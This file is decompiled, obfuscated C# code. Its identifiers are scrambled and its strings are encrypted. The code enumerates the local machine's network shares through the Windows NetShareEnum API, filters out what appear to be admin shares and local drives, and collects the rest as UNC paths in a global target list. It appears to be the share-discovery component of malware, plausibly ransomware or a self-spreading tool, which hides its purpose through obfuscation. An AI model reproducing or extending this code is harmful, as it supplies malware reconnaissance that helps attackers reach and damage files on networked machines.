using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace nVxbvhuaKzC;

public sealed class SieAsnBExFce
{
	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct eNFNrHdFRgter
	{
		public string GLXXnHmYEYGJe;

		public uint zvIaHTDaFbAux;

		public string wlXtpQKDtaDM;

		public eNFNrHdFRgter(string string_0, uint uint_0, string string_1)
		{
			GLXXnHmYEYGJe = string_0;
			zvIaHTDaFbAux = uint_0;
			wlXtpQKDtaDM = string_1;
		}

		public override string ToString()
		{
			return GLXXnHmYEYGJe;
		}
	}

	[NonSerialized]
	internal static GetString getString_0;

	public eNFNrHdFRgter[] ujkgHGwjfj(string string_0)
	{
		List<eNFNrHdFRgter> list = new List<eNFNrHdFRgter>();
		int int_ = 0;
		int int_2 = 0;
		int int_3 = 0;
		int num = Marshal.SizeOf(typeof(eNFNrHdFRgter));
		IntPtr intptr_ = IntPtr.Zero;
		StringBuilder stringBuilder_ = new StringBuilder(string_0);
		int num2 = NetShareEnum(stringBuilder_, 1, ref intptr_, uint.MaxValue, ref int_, ref int_2, ref int_3);
		if (num2 == 0)
		{
			IntPtr ptr = intptr_;
			for (int i = 0; i < int_; i++)
			{
				eNFNrHdFRgter item = (eNFNrHdFRgter)Marshal.PtrToStructure(ptr, typeof(eNFNrHdFRgter));
				list.Add(item);
				ptr += num;
			}
			NetApiBufferFree(intptr_);
			return list.ToArray();
		}
		list.Add(new eNFNrHdFRgter(getString_0(107407037) + num2, 10u, string.Empty));
		return list.ToArray();
	}

	[DllImport("Netapi32.dll", SetLastError = true)]
	private static extern int NetApiBufferFree(IntPtr intptr_0);

	[DllImport("Netapi32.dll", CharSet = CharSet.Unicode)]
	private static extern int NetShareEnum(StringBuilder stringBuilder_0, int int_0, ref IntPtr intptr_0, uint uint_0, ref int int_1, ref int int_2, ref int int_3);

	public static void obYdsTprpv()
	{
		try
		{
			string[] logicalDrives = Directory.GetLogicalDrives();
			eNFNrHdFRgter[] array = new SieAsnBExFce().ujkgHGwjfj(Environment.MachineName);
			eNFNrHdFRgter[] array2 = array;
			for (int i = 0; i < array2.Length; i++)
			{
				eNFNrHdFRgter eNFNrHdFRgter = array2[i];
				if (eNFNrHdFRgter.ToString().Contains(getString_0(107404710)) || eNFNrHdFRgter.ToString().Contains(getString_0(107404701)) || eNFNrHdFRgter.ToString().Contains(getString_0(107404660)) || eNFNrHdFRgter.ToString().Contains(getString_0(107388060)) || logicalDrives.Contains(eNFNrHdFRgter.ToString().Replace(getString_0(107411948), getString_0(107404651))))
				{
					continue;
				}
				if (!FcnBvlzKWyQDwH.ErNGCzDqbgJcNq.Contains(getString_0(107388074) + Environment.MachineName + getString_0(107397097) + eNFNrHdFRgter))
				{
					FcnBvlzKWyQDwH.ErNGCzDqbgJcNq.Add(getString_0(107388074) + Environment.MachineName + getString_0(107397097) + eNFNrHdFRgter);
				}
				if (FcnBvlzKWyQDwH.DHKhstFrxWX)
				{
					try
					{
						Console.WriteLine(getString_0(107404678), getString_0(107388074) + Environment.MachineName + getString_0(107397097) + eNFNrHdFRgter);
					}
					catch (Exception)
					{
					}
				}
			}
		}
		catch (Exception ex2)
		{
			if (FcnBvlzKWyQDwH.IxPlnZLdvsZB)
			{
				try
				{
					File.AppendAllText(FcnBvlzKWyQDwH.AJzDKHoaGNRf, getString_0(107404621) + ex2.Message);
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	static SieAsnBExFce()
	{
		Strings.CreateGetStringDelegate(typeof(SieAsnBExFce));
	}
}
